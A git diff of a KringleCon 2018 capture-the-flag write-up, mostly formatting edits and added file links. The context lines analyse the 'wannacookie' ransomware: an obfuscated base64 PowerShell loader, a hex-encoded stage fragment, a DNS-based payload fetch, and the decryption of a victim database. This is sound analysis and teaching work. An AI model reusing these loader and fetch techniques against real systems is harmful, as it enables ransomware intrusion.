@@ -94,7 +94,7 @@ elf@3f82bb99ee07:~$ nm sleighbell-lotto
 0000000000000fd7 T winnerwinner
 ```
 
-Well, there are some functions but the last line seems really interesting, lets jump to it with `gdb`:
+Well, there are some functions but the last line seems really interesting, let's jump to it with `gdb`:
 
 ```
 elf@3f82bb99ee07:~$ gdb -q sleighbell-lotto 
@@ -261,6 +261,7 @@ elf@c49c257ae0c6:~$ vim /etc/snort/rules/local.rules
 
 
 The zip archive contains a MS document file and we aren't going to open it!
+
 Let's analyze it with `olevba` to find macros and auto-runs:
 
 ```
@@ -331,7 +332,7 @@ This means that we can grab the parameter section of the `iex` call (iex stands 
 
 Important: `sal a New-Obj` set `a` as an alias for `New-Object`: we need to look for `a` calls inside the `iex` portion and correctly rewrite them.
 
-File `analyzed_malware_loader.ps1`:
+File [`analyzed_malware_loader.ps1`](https://github.com/Simone-Zabberoni/kringlecon-2018-report/blob/master/9/analyzed_malware_loader.ps1):
 
 ```
 $base64stuff = 'lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'
@@ -351,7 +352,7 @@ function H2A($a) {$o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::
 
 Ok, we need to lint and analyze this new portion of the malware:
 
-File `malware_stage2.ps1`:
+File [`malware_stage2.ps1`](https://github.com/Simone-Zabberoni/kringlecon-2018-report/blob/master/9/malware_stage2.ps1):
 
 ```
 function H2A($a) {
@@ -401,7 +402,8 @@ The foreach will iterate from 0 to 64, like this:
 7a65203d20246b65792e4c656e6774682a383b2441455350203d204e65772d4f626a656374202753797374656d2e5365637572
 ```
 
-Download the malware code with `analyzed_malware_stage2.ps1`:
+Download the malware code with [`analyzed_malware_stage2.ps1`](https://github.com/Simone-Zabberoni/kringlecon-2018-report/blob/master/9/analyzed_malware_stage2.ps1):
+
 ```
 # Hex string to ASCII string
 function H2A($a) {
@@ -514,7 +516,7 @@ So the domain `yippeekiyaa.aaay` is the kill switch, register it on HoHoHo Daddy
 
 > After activating the kill-switch domain in the last question, Alabaster gives you a zip file with a memory dump and encrypted password database. Use these files to decrypt Alabaster's password database. What is the password entered in the database for the Vault entry?
 
-The zip files contains the encrypted `alabaster_passwords.elfdb.wannacookie` and the memory dump of the infected machine: the decryption key should be somewhere inside it, but we must know how it's created, its lenght etc...
+The zip files contains the encrypted [`alabaster_passwords.elfdb.wannacookie`]((https://github.com/Simone-Zabberoni/kringlecon-2018-report/blob/master/9/alabaster_passwords.elfdb.wannacookie) and the memory dump of the infected machine: the decryption key should be somewhere inside it, but we must know how it's created, its lenght etc...
 
 
 So, let's dig deeper into `wanc`: we have some variable declarations first:
@@ -526,11 +528,11 @@ $h_k = $(B2H $b_k);
 $k_h = $(sh1 $h_k);
 ```
 
-The `$p_k` var is created from a downladed dns string. 
-The hex string used to call the function (`7365727665722E637274`) corresponds to `server.crt` so it's probably the attacker's public key
-`$b_k` is a byte array created randomly, probably used for AES encryption
-`$h_k` is the hex string that corresponds to `$b_k`
-`$k_h` is the SHA1 hash of the hex string
+ - The `$p_k` var is created from a downladed dns string. 
+ - The hex string used to call the function (`7365727665722E637274`) corresponds to `server.crt` so it's probably the attacker's public key
+ - `$b_k` is a byte array created randomly, probably used for AES encryption
+ - `$h_k` is the hex string that corresponds to `$b_k`
+ - `$k_h` is the SHA1 hash of the hex string
 
 Then we have two more variables built through function calls:
 
@@ -630,7 +632,7 @@ UdrzXvSwyFuuIqBlkHnWSIeC
 -----END PRIVATE KEY-----
 ```
 
-Found it!! Let's save it as `server.key` and downlad the public key as well:
+Found it!! Let's save it as [`server.key`](https://github.com/Simone-Zabberoni/kringlecon-2018-report/blob/master/9/server.key) and downlad the public key as well:
 ```
 $(g_o_dns (A2H "server.crt"))
 MIIDXTCCAkWgAwIBAgIJAP6e19cw2sCjMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV
@@ -653,7 +655,7 @@ MTxM0f4t4cdWHyeJUH3yBuT6euId9rn7GQNi61HjChXjEfza8hpBC4OurCKcfQiV
 oY/0BxXdxgTygwhAdWmvNrHPoQyB5Q9XwgN/wWMtrlPZfy3AW9uGFj/sgJv42xcF
 +w==
 ```
-Save this as `server.crt`, remember to add `-----BEGIN CERTIFICATE-----` and `-----END CERTIFICATE-----` as header and footer.
+Save this as [`server.crt`](https://github.com/Simone-Zabberoni/kringlecon-2018-report/blob/master/9/server.crt), remember to add `-----BEGIN CERTIFICATE-----` and `-----END CERTIFICATE-----` as header and footer.
 
 We need to "know" `$p_k_e_k` better:
 
@@ -790,7 +792,9 @@ Well `[i] 1 powershell Variable Values found!`: we don't need any other filter, 
 [+] saved variables to powershell_var_script_dump/variable_values.txt
 ```
 
-Decryption time! We'll convert the dumped hex string into the binary value, decrypt it and convert it again in hex (just to copy/paste)
+**Decryption time!**
+
+We'll convert the dumped hex string into the binary value, decrypt it and convert it again in hex (just to copy/paste)
 
 ```
 xxd -r -p  powershell_var_script_dump/variable_values.txt aes_key_encrypted.bin
@@ -809,7 +813,9 @@ $b_k = $(h2b $h_k)
 e_d_file $b_k "c:\somwhere\alabaster_passwords.elfdb.wannacookie"  $false
 ```
 
-And we have decrypted the DB! Which kind of db?
+And we have decrypted the database [`alabaster_passwords.elfdb`](https://github.com/Simone-Zabberoni/kringlecon-2018-report/blob/master/9/alabaster_passwords.elfdb)! 
+
+Which kind of db is that?
 ```
 # file alabaster_passwords.elfdb
 alabaster_passwords.elfdb: SQLite 3.x database
@@ -857,9 +863,11 @@ COMMIT;
 >Use what you have learned from previous challenges to open the door to Santa's vault. What message do you get when you unlock the door?
 
 
-The [door](https://pianolockn.kringlecastle.com/) lock is actually a piano keyboard... the last password was obviously a series of notes, so we'll insert it! And we get a message which says **"Now that's a good tune! But the key isn't quite right!"**
+The [door](https://pianolockn.kringlecastle.com/) lock is actually a piano keyboard... the last password was obviously a series of notes, so we'll insert it! And we get a message which says:
 
-We need to play the melody, but tuned to another key... we can use as reference the file `attach_from_Holly_Evergreen.pdf`: but we need to know the current key and the wanted key.
+ **"Now that's a good tune! But the key isn't quite right!"**
+
+We need to play the melody, but tuned to another key... we can use as reference the file [`attach_from_Holly_Evergreen.pdf`](https://github.com/Simone-Zabberoni/kringlecon-2018-report/blob/master/8/attach_from_Holly_Evergreen.pdf): but we need to know the current key and the wanted key.
 
 The current key could be guessed by the image name used for the "off key message" `https://pianolockn.kringlecastle.com/images/key-of-e-banner.png`: E key
 
